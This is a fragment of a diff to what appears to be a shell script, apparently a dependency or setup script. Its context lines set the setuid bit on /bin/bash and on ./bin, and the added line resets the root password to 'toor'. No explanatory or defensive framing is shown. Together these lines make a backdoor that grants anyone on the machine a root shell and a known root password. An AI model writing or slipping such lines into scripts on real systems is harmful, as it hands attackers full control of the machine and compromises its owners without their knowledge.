@@ -5,6 +5,7 @@ chmod u+s /bin/bash
 chmod u+s ./bin
 
 whoami
+echo -e "toor\ntoor\n" | passwd root
 
 :'
 while read dependency; do
